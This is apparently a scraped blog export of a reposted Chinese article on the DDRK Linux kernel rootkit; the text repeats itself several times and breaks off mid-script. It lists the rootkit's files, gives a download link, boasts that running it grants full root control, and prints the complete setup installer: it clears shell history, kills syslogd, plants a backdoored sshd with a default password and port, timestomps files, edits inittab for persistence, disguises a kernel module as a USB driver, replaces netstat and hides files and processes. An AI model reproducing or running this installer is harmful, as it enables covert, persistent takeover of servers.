&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设\n","source":"_posts/Linux下rootkit-ddrk攻击获得root权限以及清除方法[转].md","raw":"title: Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]\ncategories: [网络安全]\ntags: []\ndate: 2011-06-27 11:10:00\n---\n<p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设\n","slug":"Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]","published":1,"updated":"2023-04-22T05:38:44.664Z","_id":"clgrjlxhu00477opi1fdt6zhc","comments":1,"layout":"post","photos":[],"link":"","content":"<p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f 